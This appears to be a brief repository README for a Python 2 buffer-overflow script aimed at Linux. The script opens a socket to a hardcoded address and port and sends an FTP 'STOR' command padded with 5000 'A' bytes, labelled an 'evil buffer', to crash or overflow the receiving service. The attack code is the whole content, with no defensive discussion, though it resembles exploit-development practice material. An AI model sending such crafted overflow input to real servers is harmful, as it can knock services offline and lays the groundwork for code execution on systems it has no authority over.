# Buffer-Overflow-Python
for Linux

#!/usr/bin/python
import socket
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

#this will send to the target ip through target port a character(\x41(A)) 5000 times
buffer = '\x41' * 5000
print "\nSending evil buffer..."
s.connect(('192.168.1.18',4321))
s.send('STOR' + buffer + '\r\n')
s.close()
